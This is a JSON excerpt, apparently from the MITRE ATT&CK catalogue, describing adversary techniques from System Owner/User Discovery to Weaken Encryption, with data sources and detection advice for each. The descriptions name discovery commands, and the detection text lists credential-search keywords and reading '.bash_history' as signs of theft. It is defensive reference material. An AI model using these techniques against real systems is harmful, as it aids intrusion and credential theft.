                "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nUtilities and commands that acquire this information include <code>whoami</code>. In Mac and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.",
                "url": "https://attack.mitre.org/techniques/T1033",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "permissions": [
                    "User",
                    "Administrator"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1007",
                "name": "System Service Discovery",
                "description": "Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are \"sc,\" \"tasklist /svc\" using [Tasklist](https://attack.mitre.org/software/S0057), and \"net start\" using [Net](https://attack.mitre.org/software/S0039), but adversaries may also use other tools as well. Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "url": "https://attack.mitre.org/techniques/T1007",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "permissions": [
                    "User",
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1569",
                "name": "System Services",
                "description": "Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.",
                "url": "https://attack.mitre.org/techniques/T1569",
                "data_sources": [
                    "Command: Command Execution",
                    "Process: Process Creation",
                    "Service: Service Creation",
                    "File: File Modification",
                    "Windows Registry: Windows Registry Key Modification"
                ],
                "detection": "Monitor for command line invocations of tools capable of modifying services that doesn�t correspond to normal usage patterns and known software, patch cycles, etc. Also monitor for changes to executables and other files associated with services. Changes to Windows services may also be reflected in the Registry.",
                "permissions": [
                    "User",
                    "Administrator",
                    "SYSTEM",
                    "root"
                ],
                "platforms": [
                    "Windows",
                    "macOS"
                ],
                "tactics": [
                    "execution"
                ]
            },
            {
                "id": "T1529",
                "name": "System Shutdown/Reboot",
                "description": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer.(Citation: Microsoft Shutdown Oct 2017) Shutting down or rebooting systems may disrupt access to computer resources for legitimate users.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)",
                "url": "https://attack.mitre.org/techniques/T1529",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Sensor Health: Host Status"
                ],
                "detection": "Use process monitoring to monitor the execution and command line parameters of binaries involved in shutting down or rebooting systems. Windows event logs may also designate activity associated with a shutdown/reboot, ex. Event ID 1074 and 6006.",
                "permissions": [
                    "User",
                    "Administrator",
                    "root",
                    "SYSTEM"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "impact"
                ]
            },
            {
                "id": "T1124",
                "name": "System Time Discovery",
                "description": "An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service)\n\nSystem time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. (Citation: Technet Windows Time Service)\n\nThis information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) (Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)",
                "url": "https://attack.mitre.org/techniques/T1124",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Process: OS API Execution"
                ],
                "detection": "Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1080",
                "name": "Taint Shared Content",
                "description": "\nAdversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)\n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",
                "url": "https://attack.mitre.org/techniques/T1080",
                "data_sources": [
                    "Process: Process Creation",
                    "File: File Creation",
                    "File: File Modification",
                    "Network Share: Network Share Access"
                ],
                "detection": "Processes that write or overwrite many files to a network shared directory may be suspicious. Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to Command and Control and possible network Discovery techniques.\n\nFrequently scan shared network directories for malicious files, hidden files, .LNK files, and other file types that may not typical exist in directories used to share specific types of content.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "lateral-movement"
                ]
            },
            {
                "id": "T1221",
                "name": "Template Injection",
                "description": "Adversaries may create or modify references in Office document templates to conceal malicious code or force authentication attempts. Microsoft�s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. (Citation: Microsoft Open XML July 2017)\n\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\n\nAdversaries may abuse this technology to initially conceal malicious code to be executed via documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. (Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. (Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. (Citation: MalwareBytes Template Injection OCT 2017)\n\nThis technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt. (Citation: Anomali Template Injection MAR 2018) (Citation: Talos Template Injection July 2017) (Citation: ryhanson phishery SEPT 2016)",
                "url": "https://attack.mitre.org/techniques/T1221",
                "data_sources": [
                    "Process: Process Creation",
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Analyze process behavior to determine if an Office application is performing actions, such as opening network connections, reading files, spawning abnormal child processes (ex: [PowerShell](https://attack.mitre.org/techniques/T1059/001)), or other suspicious actions that could relate to post-compromise behavior.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1205",
                "name": "Traffic Signaling",
                "description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.(Citation: Cisco Synful Knock Evolution) (Citation: FireEye - Synful Knock) (Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL) (Citation: AMD Magic Packet)",
                "url": "https://attack.mitre.org/techniques/T1205",
                "data_sources": [
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.\n\nThe Wake-on-LAN magic packet consists of 6 bytes of <code>FF</code> followed by sixteen repetitions of the target system's IEEE address. Seeing this string anywhere in a packet's payload may be indicative of a Wake-on-LAN attempt.(Citation: GitLab WakeOnLAN)",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ],
                "tactics": [
                    "defense-evasion",
                    "persistence",
                    "command-and-control"
                ]
            },
            {
                "id": "T1537",
                "name": "Transfer Data to Cloud Account",
                "description": "Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.\n\nA defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.\n\nIncidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018) ",
                "url": "https://attack.mitre.org/techniques/T1537",
                "data_sources": [
                    "Snapshot: Snapshot Creation",
                    "Snapshot: Snapshot Modification",
                    "Cloud Storage: Cloud Storage Modification",
                    "Cloud Storage: Cloud Storage Creation"
                ],
                "detection": "Monitor account activity for attempts to share data, snapshots, or backups with untrusted or unusual accounts on the same cloud service provider. Monitor for anomalous file transfer activity between accounts and to untrusted VPCs. ",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "IaaS"
                ],
                "tactics": [
                    "exfiltration"
                ]
            },
            {
                "id": "T1127",
                "name": "Trusted Developer Utilities Proxy Execution",
                "description": "Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.",
                "url": "https://attack.mitre.org/techniques/T1127",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution"
                ],
                "detection": "Monitor for abnormal presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.\n\nUse process monitoring to monitor the execution and arguments of from developer utilities that may be abused. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1199",
                "name": "Trusted Relationship",
                "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)",
                "url": "https://attack.mitre.org/techniques/T1199",
                "data_sources": [
                    "Application Log: Application Log Content",
                    "Logon Session: Logon Session Metadata",
                    "Logon Session: Logon Session Creation"
                ],
                "detection": "Establish monitoring for activity conducted by second and third party providers and other trusted entities that may be leveraged as a means to gain access to the network. Depending on the type of relationship, an adversary may have access to significant amounts of information about the target before conducting an operation, especially if the trusted relationship is based on IT services. Adversaries may be able to act quickly towards an objective, so proper monitoring for behavior related to Credential Access, Lateral Movement, and Collection will be important to detect the intrusion.",
                "platforms": [
                    "Windows",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS"
                ],
                "tactics": [
                    "initial-access"
                ]
            },
            {
                "id": "T1111",
                "name": "Two-Factor Authentication Interception",
                "description": "Adversaries may target two-factor authentication mechanisms, such as smart cards, to gain access to credentials that can be used to access systems, services, and network resources. Use of two or multi-factor authentication (2FA or MFA) is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \n\nIf a smart card is used for two-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)\n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)\n\nOther methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors. (Citation: Operation Emmental)",
                "url": "https://attack.mitre.org/techniques/T1111",
                "data_sources": [
                    "Windows Registry: Windows Registry Key Modification",
                    "Driver: Driver Load",
                    "Process: OS API Execution"
                ],
                "detection": "Detecting use of proxied smart card connections by an adversary may be difficult because it requires the token to be inserted into a system; thus it is more likely to be in use by a legitimate user and blend in with other network behavior.\n\nSimilar to [Input Capture](https://attack.mitre.org/techniques/T1056), keylogging activity can take various forms but can may be detected via installation of a driver, setting a hook, or usage of particular API calls associated with polling to intercept keystrokes.",
                "permissions": [
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "tactics": [
                    "credential-access"
                ]
            },
            {
                "id": "T1552",
                "name": "Unsecured Credentials",
                "description": "Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)), or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).",
                "url": "https://attack.mitre.org/techniques/T1552",
                "data_sources": [
                    "Command: Command Execution",
                    "File: File Access",
                    "Process: Process Creation",
                    "User Account: User Account Authentication",
                    "Windows Registry: Windows Registry Key Access"
                ],
                "detection": "While detecting adversaries accessing credentials may be difficult without knowing they exist in the environment, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.\n\nMonitor for suspicious file access activity, specifically indications that a process is reading multiple files in a short amount of time and/or using command-line arguments  indicative of searching for credential material (ex: regex patterns). These may be indicators of automated/scripted credential access behavior.\n\nMonitoring when the user's <code>.bash_history</code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like \"history\" instead of commands like <code>cat ~/.bash_history</code>.\n\nAdditionally, monitor processes for applications that can be used to query the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.",
                "permissions": [
                    "User",
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace",
                    "Containers"
                ],
                "tactics": [
                    "credential-access"
                ]
            },
            {
                "id": "T1535",
                "name": "Unused/Unsupported Cloud Regions",
                "description": "Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.\n\nCloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.\n\nA variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.\n\nAn example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions)",
                "url": "https://attack.mitre.org/techniques/T1535",
                "data_sources": [
                    "Instance: Instance Creation"
                ],
                "detection": "Monitor system logs to review activities occurring across all cloud environments and regions. Configure alerting to notify of activity in normally unused regions or if the number of instances active in a region goes above a certain threshold.(Citation: CloudSploit - Unused AWS Regions)",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "IaaS"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1550",
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system�either in memory or on disk�it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "url": "https://attack.mitre.org/techniques/T1550",
                "data_sources": [
                    "Logon Session: Logon Session Creation",
                    "Web Credential: Web Credential Usage",
                    "Application Log: Application Log Content",
                    "User Account: User Account Authentication",
                    "Active Directory: Active Directory Credential Request"
                ],
                "detection": "Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).",
                "platforms": [
                    "Windows",
                    "Office 365",
                    "SaaS",
                    "Google Workspace"
                ],
                "tactics": [
                    "defense-evasion",
                    "lateral-movement"
                ]
            },
            {
                "id": "T1204",
                "name": "User Execution",
                "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "url": "https://attack.mitre.org/techniques/T1204",
                "data_sources": [
                    "Application Log: Application Log Content",
                    "Instance: Instance Start",
                    "Instance: Instance Creation",
                    "Image: Image Creation",
                    "Command: Command Execution",
                    "Container: Container Start",
                    "Container: Container Creation",
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Content",
                    "File: File Creation",
                    "Process: Process Creation"
                ],
                "detection": "Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS",
                    "IaaS",
                    "Containers"
                ],
                "tactics": [
                    "execution"
                ]
            },
            {
                "id": "T1078",
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)",
                "url": "https://attack.mitre.org/techniques/T1078",
                "data_sources": [
                    "User Account: User Account Authentication",
                    "Logon Session: Logon Session Creation"
                ],
                "detection": "Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.",
                "permissions": [
                    "User",
                    "Administrator"
                ],
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace",
                    "Containers"
                ],
                "tactics": [
                    "defense-evasion",
                    "persistence",
                    "privilege-escalation",
                    "initial-access"
                ]
            },
            {
                "id": "T1125",
                "name": "Video Capture",
                "description": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)",
                "url": "https://attack.mitre.org/techniques/T1125",
                "data_sources": [
                    "Process: OS API Execution",
                    "Command: Command Execution"
                ],
                "detection": "Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "macOS"
                ],
                "tactics": [
                    "collection"
                ]
            },
            {
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion",
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors. \n\nAdversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)\n\n",
                "url": "https://attack.mitre.org/techniques/T1497",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Process: OS API Execution"
                ],
                "detection": "Virtualization, sandbox, user activity, and related discovery techniques will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.",
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ],
                "tactics": [
                    "defense-evasion",
                    "discovery"
                ]
            },
            {
                "id": "T1600",
                "name": "Weaken Encryption",
                "description": "Adversaries may compromise a network device�s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device�s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",
                "url": "https://attack.mitre.org/techniques/T1600",
                "data_sources": [
                    "File: File Modification"
                ],
